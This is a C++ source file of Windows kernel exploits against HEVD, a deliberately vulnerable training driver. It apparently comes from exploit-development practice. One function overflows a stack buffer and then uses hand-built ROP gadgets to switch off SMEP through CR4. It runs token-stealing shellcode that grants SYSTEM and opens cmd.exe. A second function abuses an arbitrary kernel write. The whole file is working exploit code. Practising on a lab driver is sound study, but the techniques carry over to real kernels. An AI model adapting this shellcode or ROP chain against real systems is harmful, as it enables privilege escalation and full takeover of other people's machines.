#include "exploits.h"
#include "util.h"
#include <iostream>
#include <winternl.h>

void bufferOverflowStack(HANDLE hDevice) {

    char sc[] = "\xB9\xFF\xFF\xFF\xFF\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x48\x8D\x80\xF0\x02\x00\x00\x48\x8B\x00\x48\x8B\x58\xF8\x48\x83\xFB\x04\x75\xF3\x48\x8B\x58\x68\x53\x48\x8B\x00\x48\x8B\x58\xF8\x39\xCB\x75\xF5\x5B\x48\x89\x58\x68\x48\x31\xC0\x48\x83\xC4\x28\xC3";

    OPS ops = {
    { "POP_RCX", { 0x59, 0xc3 }},
    { "MOV_CR4_RCX", { 0x0f, 0x22, 0xe1, 0xc3 }},
    };

    GADGETS gadgets = util::GetGadgets(ops);

    LPVOID privescPtr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (privescPtr) {
        RtlCopyMemory(privescPtr, sc, sizeof(sc));
        pid.pidI = GetCurrentProcessId();
        *(DWORD*)((QWORD)privescPtr + 1) = pid.pidI;
    }

    else {
        printf("Failed allocating space for shellcode, Error code: %d", GetLastError());
        exit(-1);
    }

    QWORD kernelBase = util::GetKernelBase();

    int offset = 2072;
    BYTE uBuf[2104] = { 0 };
    int index = 0;

    memset(uBuf, 0x41, sizeof(uBuf));

    QWORD* rop = (QWORD*)(uBuf + offset);
    *(rop + index++) = kernelBase + gadgets["POP_RCX"];
    *(rop + index++) = 0x30678;
    *(rop + index++) = kernelBase + gadgets["MOV_CR4_RCX"];
    *(rop + index++) = (QWORD)privescPtr;

    if (!DeviceIoControl(hDevice, HEVD_IOCTL_BUFFER_OVERFLOW_STACK, (LPVOID)&uBuf, sizeof(uBuf), NULL, 0, NULL, 0)) {
        printf("Error during ioctl, error code: %d\n", GetLastError());
        exit(-1);
    }

    CloseHandle(hDevice);
    VirtualFree(privescPtr, 0, MEM_RELEASE);

    std::cout << "you are now SYSTEM" << std::endl;
    system("cmd.exe");

    exit(1);
}

void arbitraryWrite(HANDLE hDevice)
{

    struct WRITE_WHAT_WHERE {
        PULONG_PTR What;
        PULONG_PTR Where;
    };

    QWORD kernelBase = util::getBaseAddr(L"ntoskrnl.exe");

    WRITE_WHAT_WHERE buf;

    PVOID what = (PVOID)"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";

    buf.What = (PULONG_PTR)what;
    buf.Where = (PULONG_PTR)(kernelBase + 0xC00218);

    PBYTE bytes = (PBYTE)&buf;
    printf("buf: \n");
    for (int i = 0; i < sizeof(WRITE_WHAT_WHERE); i++) {
        printf("%02X ", bytes[i]);
    }
    printf("\n");

    for (int i = 0; i < 13; i++) {

        if (!DeviceIoControl(hDevice, HEVD_IOCTL_ARBITRARY_WRITE, &buf, sizeof(WRITE_WHAT_WHERE), NULL, NULL, NULL, NULL)) {
            printf("Failed ioctl, error code : %d", GetLastError());
            exit(-1);
        }

        buf.Where = (PULONG_PTR)((QWORD)buf.Where + 0x8);
    }

}
